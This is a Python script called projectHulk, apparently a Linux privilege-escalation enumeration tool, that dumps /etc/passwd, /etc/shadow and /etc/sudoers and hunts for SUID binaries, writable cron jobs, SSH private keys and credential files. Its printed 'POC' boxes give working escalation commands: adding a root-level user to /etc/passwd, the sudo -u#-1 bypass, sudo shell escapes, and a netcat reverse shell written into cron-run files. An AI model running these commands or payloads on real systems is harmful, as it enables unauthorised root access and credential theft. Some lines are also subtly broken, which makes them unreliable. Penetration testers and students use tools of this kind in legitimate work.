#!/usr/bin/python3

import os
import time
import subprocess
from time import sleep
from threading import Timer
from os import system, popen
from datetime import datetime
from colorama import init, Fore, Back, Style 
init(autoreset=True)

#------------------> Intro:
print("\n")
print("\t\t\t\t|====================================================================|")
print("\t\t\t\t|                                                                    |")
print(Style.BRIGHT + "\t\t\t\t|" + Fore.RED + "\t\t\t   projectHulk v1.0" + Fore.WHITE +"\t\t\t     |")
print("\t\t\t\t|                     ! The Incredable Script !                      |")
print("\t\t\t\t|                                                                    |")
print("\t\t\t\t|====================================================================|")

#------------------> Note:
print("\n")
print(Style.BRIGHT + Fore.BLUE + "Note:")
print("        This script is designed to help security team (SOC) and/or educational purposes in finding system vulnerability that may")
print("        lead to privilege escatation & it should be used in safe environment, not agenst others to harm there system or hack it")
print("        The author is not responsible for any missuse of it")

#------------------> Auth:
print("\n")
print(Style.BRIGHT + Fore.BLUE + "4uth0r:")
print("             Iron Hulk")
print("        Man In A Black Tuxedu")

#------------------> Accounts:
print("\n")
print(Style.BRIGHT + Fore.BLUE + "Contact:")
print("        Telegram: IronHulk_x69")

#------------------> Recommendation:
print("\n")
print(Style.BRIGHT + Fore.BLUE + "Recomended:")
print("        For a better view of the report is it recomended to redirect the output to a file, python projectHULK.py > report.txt")

#------------------> Message:
print("\n")
print(Style.BRIGHT + Fore.BLUE + "Message:")
print("        All the POC's have been listed based on the author's Opinion, you may use anything you which")
print(Style.BRIGHT + Fore.GREEN +"        rememebr, SKY HAS NO LIMITS :)")

#------------------> Enumeration:
print("\n")
print(Style.BRIGHT + Fore.RED + "Enumeration on progress #................................................................................. 1%")
print("\n")
time.sleep(5)

print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]------------------------------------------------------- [ Password File Permission ] -------------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)

#------------------> Password File:
print("\nThe password file is a plain text-based database that contains information for all user accounts on the system. It is owned by root. The file can only be modified by root or users with sudo privileges and readable by all system users. ")
print(Style.BRIGHT + Fore.BLUE + "\n[+] Password file")
returned_text = subprocess.check_output("ls -la /etc/passwd", shell=True, universal_newlines=True)
if(returned_text[2]== 'w'and returned_text[5]=='w'and returned_text[8]=='w'):
    print("{}".format(returned_text))
    print(Style.BRIGHT + Back.RED + Fore.WHITE + "File is Exploitable")
    print("\t  |==============================================================|")
    print("\t  |The file can be abused by copying the root detail &           |")
    print("\t  |replacing the root name by other name with root hash details  |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "POC:" + Fore.WHITE + "                                                          |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "First generate a password with one of the following commands:" + Fore.WHITE + " |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "    openssl passwd -1 -salt hulk password" + Fore.WHITE + "                     |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + '    perl -le ''print crypt("hulk", "password")''' + Fore.WHITE + "                  |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "Overwrite the password file:" + Fore.WHITE + "                                  |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "    echo 'hulk:HASH:0:0::/root:/bin/bash' >> /etc/passwd" + Fore.WHITE + "      |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "Then do: su hulk" + Fore.WHITE + "                                              |")
    print("\t  |==============================================================|")
else:
    print("{}".format(returned_text))
    print(Style.BRIGHT + Back.GREEN + Fore.WHITE + "Password File Is Not Writable")
print(Style.BRIGHT + Fore.BLUE + "\n[+] Reading The Password File:")
os.system ('cat /etc/passwd')

#------------------> Shadow File:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Shadow file")
os.system ('ls -la /etc/shadow')
try:
       returned_text=subprocess.check_output("cat /etc/shadow",shell=True,stderr=subprocess.STDOUT)
except subprocess.CalledProcessError as e:
       returned_text=("{}  ".format(e.output))
if (returned_text.find("Permission denied") > -1 ):
    print("    {}".format(returned_text))
    print(Style.BRIGHT + Back.GREEN + Fore.WHITE + "File Is Protected")
else:
    print("    {}".format(returned_text))
    print(Style.BRIGHT + Back.RED + Fore.WHITE + "File is Exploitable")
    print("\t  |==============================================================|")
    print("\t  |The file can be abused by changing the root HASH & replace it |")
    print("\t  |with the attacker's HASH                                      |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "POC:" + Fore.WHITE + "                                                          |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "Open the shadow file using any text edirot of your choice:" + Fore.WHITE + "    |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "    - Generate a new Shadow Hash and replace it with the " + Fore.WHITE + "     |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "    - current root hash " + Fore.WHITE + "                                      |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "    - \tmkpasswd  -m sha-512 -S prove -s  " + Fore.WHITE + "               |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "    - OR copy your HASH from your system and replace it with " + Fore.WHITE + " |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "    - the root hash" + Fore.WHITE + "                                           |")
    print("\t  |==============================================================|")
    print("\n")
    print(Style.BRIGHT + Back.GREEN + Fore.WHITE + "How to protect the file")
    print("\t  |==============================================================|")
    print("\t  |Limit the access to it and make sure it can be read or        |")
    print("\t  |written only by root                                          |")
    print(Style.BRIGHT +"\t  |" + Fore.RED + "POC:" + Fore.WHITE + "                                                          |")
    print(Style.BRIGHT +"          |" + Fore.RED + "chmod 600 /etc/shadow" + Fore.WHITE + "                                         |")
    print("\t  |==============================================================|")
    time.sleep(2)

#------------------> Sudoers File:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Sudoers file")
os.system ('ls -la /etc/sudoers')
try:
       returned_text=subprocess.check_output("cat /etc/sudoers",shell=True,stderr=subprocess.STDOUT)
except subprocess.CalledProcessError as e:
       returned_text=("{}  ".format(e.output))
if (returned_text.find("Permission denied") > -1 ):
    print("{}".format(returned_text))
    print(Style.BRIGHT + Back.GREEN + Fore.WHITE + "File Is Protected")
else:
    print("{}".format(returned_text))
    print(Style.BRIGHT + Back.RED + Fore.WHITE + "File is Exploitable")
    print("\t  |==============================================================|")
    print("\t  |The file shows a fully detailed about what the curent user my |")
    print("\t  |run as root. If the running file orapplication has a globle   |")
    print("\t  |vulnerability, the attacker may google it and abuse it for    |")
    print("\t  |user escalation                                               |")
    print("\t  |==============================================================|")

#------------------> User Group Lists:
print(Style.BRIGHT + Fore.BLUE + "\n[+] User Group list")
os.system ('ls -la /etc/group')
os.system('cat /etc/group')

#------------------> Password Policy:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Password Policy:")
os.system ('grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs')

#------------------> Superusers:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Superuser:")
os.system ("awk -F: '($3 == '0') {print}' /etc/passwd")

#------------------> List users with console:
print(Style.BRIGHT + Fore.BLUE + "\n[+] List users with console:")
os.system ('cat /etc/passwd | grep "sh$"')


print("\n")
print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]---------------------------------------------------------- [ System Information ] ----------------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)
#------------------> User Group Lists:
print(Style.BRIGHT + Fore.BLUE + "\n[+] User may run sudo on:")
try:
	returned_text = subprocess.check_output("sudo -l", shell=True, universal_newlines=True, timeout=300000)
	print(returned_text)
except:
	print("Try to run sudo -l with password")

#------------------> Current user is:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Current user is:")
os.system ('whoami')

#------------------> User ID:
print(Style.BRIGHT + Fore.BLUE + "\n[+] User ID:")
os.system ('id')

#------------------> System Name:
print(Style.BRIGHT + Fore.BLUE + "\n[+] System Name:")
os.system ('uname -a')

#------------------> System Release:
print(Style.BRIGHT + Fore.BLUE + "\n[+] System Release:")
os.system ('lsb_release -a')

#------------------> Host Name:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Host name:")
os.system ('hostname')

#------------------>s System Version:
print(Style.BRIGHT + Fore.BLUE + "\n[+] System Version:")
os.system ('cat /proc/version || uname -a 2>/dev/null')
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |The version is not listed in our database. However make sure  |")
print("\t  |to keep your system always up-to-date. Old version are always |")
print("\t  |vulnerab. Visit the link bellow for more details:             |")
print("\t  |https://github.com/SecWiki/linux-kernel-exploits              |")
print("\t  |Or use:                                                       |")
print('\t  |searchsploit "Linux Kernel"                                   |')
print("\t  |==============================================================|")
print("\n")
print(Style.BRIGHT + Back.RED + Fore.WHITE + "List of vulnerable kernel versions:")
print("\t  |==========================================================================================================|")
print("\t  |3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 |")
print("\t  |3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1|")
print("\t  |3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    |")
print("\t  |2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 |")
print("\t  |2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  |")
print("\t  |2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   |")
print("\t  |2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  |")
print("\t  |2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         |")
print("\t  |==========================================================================================================|")

#------------------> Sudo Version:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Sudo Version:")
os.system ('sudo -V | grep "Sudo ver"')
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |The version is not listed in our database. However make sure  |")
print("\t  |to keep your system always up-to-date. Old version are        |")
print("\t  |vulnerab. Use google for more details                         |")
print("\t  |Or use:                                                       |")
print('\t  |searchsploit "sudo"                                           |')
print("\t  |==============================================================|")

#------------------> is sudo version vulnerable:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Is sudo version vulnerable?")
os.system ('sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"')
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |If the sudo version <= v1.28, it is exploitable               |")
print(Style.BRIGHT +"\t  |" + Fore.RED + "POC:" + Fore.WHITE + "                                                          |")
print(Style.BRIGHT +"\t  |" + Fore.RED + "sudo -u#-1 /bin/bash" + Fore.WHITE + "\t\t\t\t\t\t |")
print("\t  |==============================================================|")

#------------------> who is logged on:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Who's logged in:")
os.system ('w')

#------------------> Path Environment:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Path Environment:")
os.system ('systemctl show-environment')
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |If you have write permissions on any folder inside the PATH   |")
print("\t  |variable you may be able to hijacking some libraries or       |")
print("\t  |binaries.                                                     |")
print("\t  |https://github.com/SecWiki/linux-kernel-exploits              |")
print("\t  |==============================================================|")

#------------------> Env Information:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Env Info:")
os.system ('systemctl show-environment')

print("\n")
print(Style.BRIGHT + Fore.RED + "Enumeration on progress ###################............................................................... 20%")
print("\n")
time.sleep(5)

print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]----------------------------------------------------------- [ System Date/Time ] -----------------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)
#------------------> System Up Time:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Up Time:")
with open("/proc/uptime", "r") as f:
	uptime = f.read().split(" ")[0].strip()
uptime = int(float(uptime))
uptime_hours = uptime // 3600
uptime_minutes = (uptime % 3600) // 60
print("   " + str(uptime_hours) + ":" + str(uptime_minutes) + " hours")

#------------------> System Date:
print(Style.BRIGHT + Fore.BLUE + "\n[+] System Date:")
os.system ('date 2>/dev/null')

#------------------> CPU Information:
print(Style.BRIGHT + Fore.BLUE + "\n[+] CPU Information:")
os.system ('lscpu')


print("\n")
print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]------------------------------------------------------------- [ System SUID ] --------------------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)

#------------------> Find capability:
print (Style.BRIGHT + Fore.BLUE + "\n[+] Find capability files")
returned_text = subprocess.check_output("getcap -r / 2>/dev/null", shell=True, universal_newlines=True)
flag= 0
test= returned_text.split(" ")
for word in test :
     if word == "cap_setuid+ep":
        print(word)
        flag= 1
if (flag==0):
    print("{}".format(returned_text))
else:
    print("{}".format(returned_text))
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |Capabitity files are diffrent from system to system, google   |")
print("\t  |for more information and the exploit 'IF FOUND'               |")
print("\t  |==============================================================|")

#------------------> Built-in Binaries:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Built-in Binaries")
Built_inlist =["/usr/lib/dbus-1.0/dbus-daemon-launch-helper","/usr/libexec/polkit-agent-helper-1","/usr/bin/vmware-user-suid-wrapper","/usr/lib/chromium/chrome-sandbox","/usr/bin/ntfs-3g","/usr/sbin/mount.nfs","/usr/sbin/mount.cifs","/usr/lib/xorg/Xorg.wrap","/usr/lib/openssh/ssh-keysign","/usr/bin/su","/usr/bin/chfn","/usr/bin/sudo","/usr/bin/chsh","/usr/sbin/pppd","/usr/bin/mount","/usr/sbin/exim4","/usr/bin/umount","/usr/bin/pkexec","/usr/bin/passwd","/usr/bin/newgrp","/usr/bin/gpasswd"]
for libe in Built_inlist:
    print("{}".format(libe))
returned_text
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |Most linux system have these Binaries and they are builtin    |")
print("\t  |no escalation is done by them unless file permission has been |")
print("\t  |change.                                                       |")
print("\t  |==============================================================|")

#------------------> Finding System SUID:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Finding System SUID")    
try:
    returned_text =subprocess.check_output("find / -perm -u=s 2>/dev/null",shell=True,stderr=subprocess.STDOUT) # add | xargs ls -l
except subprocess.CalledProcessError as e:
    returned_text="{}".format(e.output)
print(returned_text)
ttt =returned_text.split()
print(Style.BRIGHT + Fore.BLUE + "[+] Not Buld-in SUID")
result = list(set(ttt) - set(Built_inlist))
for line in result:
    print("{}".format(line))
    print("\n")
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |These are not bulit-in binnaries and worth to goolge them for |")
print("\t  |any exploit that my lead to privilage escalation              |")
print("\t  |Visite:                                                       |")
print("\t  |https://gtfobins.github.io/                                   |")
print("\t  |==============================================================|")

#------------------> Finding System GUID:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Finding System GUID")
os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -l')

#------------------> Execute as the owner:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Find Binaries that will execute as the owner")
os.system ('find / -perm -u=s -type f 2>/dev/null | xargs ls -l')

#------------------> Execute as the group:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Find binaries that will execute as the group")
os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -l')

#------------------> Sticky-bit binaries:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Find sticky-bit binaries")
os.system ('find / -perm -1000 -type d 2>/dev/null | xargs ls -l && find / -perm -4000 2>/dev/null | xargs ls -l')

#------------------> World writable scripts invoked as root:
print(Style.BRIGHT + Fore.BLUE + "\n[+] World writable scripts invoked as root")
os.system ('find / -writable -type f 2>/dev/null | xargs ls -l')
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |If you find a script that is owned by root but is writable by |")
print("\t  |anyone you can add your own malicious code in that script that|")
print("\t  |will escalate your privileges when the script is run as root  |")
print("\t  |==============================================================|")

#------------------> World writeable directories:
print(Style.BRIGHT + Fore.BLUE + "\n[+] World writeable directories")
os.system ('find / -perm -2 -type d 2>/dev/null && find / -type d -perm -g+w -or -perm -o+w 2>/dev/null && find / -type d -perm -g+w 2>/dev/null && find / -type d -perm -o+w 2>/dev/null')

#------------------> Writeable config files:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Writeable config files")
os.system ('find /etc/ -writable -type f 2>/dev/null | xargs ls -l')

#------------------> How Files Can Be Uploaded:
print(Style.BRIGHT + Fore.BLUE + "\n[+] How Files Can Be Uploaded")
os.system ('which wget')
os.system ('which nc')
os.system ('which netcat')
os.system ('which socat')
os.system ('which python')
os.system ('which python3')
os.system ('which ftp')
os.system ('which tftp')
os.system ('which ssh')

#------------------> Writeable config files:
print("\n")
print(Style.BRIGHT + Fore.BLUE + "Unexpected commands allows you to read and/or write files or even execute command")
print("\t  |==============================================================|")
print('\t  |sudo awk "BEGIN {system("/bin/sh")}"                          |')
print("\t  |sudo find /etc -exec sh -i \;                                 |")
print("\t  |sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh          |")
print("\t  |sudo tar c a.tar -I ./runme.sh a                              |")
print("\t  |ftp>!/bin/sh                                                  |")
print("\t  |less>! <shell_comand>                                         |")
print("\t  |==============================================================|")


#------------------> Profiles files:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Profiles files")
os.system ('ls -l /etc/profile /etc/profile.d/')
print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |The file /etc/profile and the files under /etc/profile.d/ are |")
print("\t  |scripts that are executed when a user run a new shell.        |")
print("\t  |Therefore, if you can write or modify any of the you can      |")
print("\t  |escalate privileges.                                          |")
print("\t  |==============================================================|")

print("\n")
print(Style.BRIGHT + Fore.RED + "Enumeration on progress #############################################..................................... 50%")
print("\n")
time.sleep(5)

print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]------------------------------------------------------------ [ System Process ] ------------------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)

print(Style.BRIGHT + Back.RED + Fore.WHITE + "Note")
print("\t  |==============================================================|")
print("\t  |Take a look to what processes are being executed and check if |")
print("\t  |any process has more privileges that it should. You can also  |")
print("\t  |use a tool called psyp.                                       |")
print("\t  |https://github.com/DominicBreuker/pspy                        |")
print("\t  |==============================================================|")
#------------------> Running Proccess:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Running Proccess on the system")
os.system ('ps aux')

#------------------> Running Proccess as root
print("Consider running the command by: ps aux | grep USERNAME")
print(Style.BRIGHT + Fore.BLUE + "\n[+] Running Proccess as root")
os.system ('ps aux | grep root')


print("\n")
print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]------------------------------------------------------ [ System Path Scheduled Tasks ] -----------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)

#------------------> Current User Crontab:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Current User Crontab")
os.system ('crontab -l')

#------------------> Scheduled Jobs:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Scheduled Jobs")
os.system ('cat /etc/crontab')

print("\n")
print(Style.BRIGHT + Back.RED + Fore.WHITE + "If the File is Writable")
print("\t  |======================================================================================|")
print("\t  |If the file is running by root, & it is writable by anyone the attacker my abuse it   |")
print("\t  |by replacing the content of it.                                                       |")
print(Style.BRIGHT +"\t  |" + Fore.RED + "POC:" + Fore.WHITE + "                                                                                  |")
print(Style.BRIGHT +"\t  |" + Fore.RED + "echo '/bin/sh' > file" + Fore.WHITE + "                                                                 |")
print(Style.BRIGHT +"\t  |" + Fore.RED + "echo '/bin/bash' > file" + Fore.WHITE + "                                                               |")
print(Style.BRIGHT +"\t  |" + Fore.RED + "echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' > file" + Fore.WHITE +"|")
print(Style.BRIGHT +"\t  |" + Fore.RED + "echo 'cp /bin/bash /tmp/bash; chmod 777 /tmp/bash' > file" + Fore.WHITE + "                             |")
print(Style.BRIGHT +"\t  |" + Fore.RED + "echo 'echo root::0:0:root:/root:/bin/bash > /etc/passwd' > file" + Fore.WHITE + "                       |")
print("\t  |======================================================================================|")

#------------------> System Timer:
print(Style.BRIGHT + Fore.BLUE + "\n[+] System Timer List")
os.system ('systemctl list-timers --all')

print("\n")
print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]------------------------------------------------------ [ Communications & Networking ] -----------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)

#------------------> Network Details:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Network Details:")
os.system ('/sbin/ifconfig')

#------------------> Firewall Rulls:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Firewall Rulls:")
os.system ('iptables -nvL')

#------------------> Open Ports:
print(Style.BRIGHT + Fore.BLUE + "\n[+]  Open Ports:")
os.system ('netstat -antp')

#------------------> Network Route:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Network Route:")
os.system ('route')

#------------------> Hosts File:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Hosts File:")
os.system ('cat /etc/hosts')

#------------------> Name Server:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Name Server:")
os.system ('cat /etc/resolv.conf')

#------------------> Neighbours:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Neighbours:")
os.system ('(route || ip n)')

print("\n")
print(Style.BRIGHT + Fore.RED + "Enumeration on progress ################################################################.................. 80%")
print("\n")
time.sleep(5)

print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]------------------------------------------------------------ [ Finding SSH Keys ] ----------------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)

#------------------> Authorized_keys:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Authorized_keys:")
os.system ('find / -name authorized_keys 2> /dev/null')

#------------------> id_rsa:
print(Style.BRIGHT + Fore.BLUE + "\n[+] id_rsa:")
os.system ('find / -name id_rsa 2> /dev/null')

print("\n")
print(Fore.RED + "[+]############################################################################################################################################[+]")
print(Fore.RED + "[+]-------------------------------------------------------------- [ Extra Creds ] -------------------------------------------------------------[+]")
print(Fore.RED + "[+]############################################################################################################################################[+]")
time.sleep(1)

#------------------> Look Manually:
print(Style.BRIGHT + Fore.BLUE + "\n[+] Mail File:")
os.system ('ls -la /var/mail/')

print(Style.BRIGHT + Fore.BLUE + "\n[+] Root Directory:")
os.system ('ls -la /root/')

print(Style.BRIGHT + Fore.BLUE + "\n[+] Home Directory:")
os.system ('ls -la /home/')

print(Style.BRIGHT + Fore.BLUE + "\n[+] tmp Directory:")
os.system ('ls -la /tmp')

print(Style.BRIGHT + Fore.BLUE + "\n[+] Backup Directory:")
os.system ('ls -la /var/backups')

print(Style.BRIGHT + Fore.BLUE + "\n[+] Apache Config File:")
os.system ('cat /var/apache2/config.inc')

print(Style.BRIGHT + Fore.BLUE + "\n[+] MySQL:")
os.system ('ls -la /var/lib/mysql')

print(Style.BRIGHT + Fore.BLUE + "\n[+] Log File:")
os.system ('ls -la /var/log')

print(Style.BRIGHT + Fore.BLUE + "\n[+] Spool File:")
os.system ('ls -la /var/spool')

print(Style.BRIGHT + Fore.BLUE + "\n[+] pgsql:")
os.system ('ls -la /var/lib/pgsql')

print(Style.BRIGHT + Fore.BLUE + "\n[+] file-systems mounted:")
os.system ('df -h')

print(Style.BRIGHT + Fore.BLUE + "\n[+] Tools/Languages Installed:")
os.system ('which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null')

print("\n")
print(Style.BRIGHT + Fore.RED + "\t\t\tEnumeration is completed ################################################################################## 100%")
print(Style.BRIGHT + Fore.RED + "\t\t\t\t projectHulk Enumeration has been completed, for any improvement, please contact us ")
print("\n")






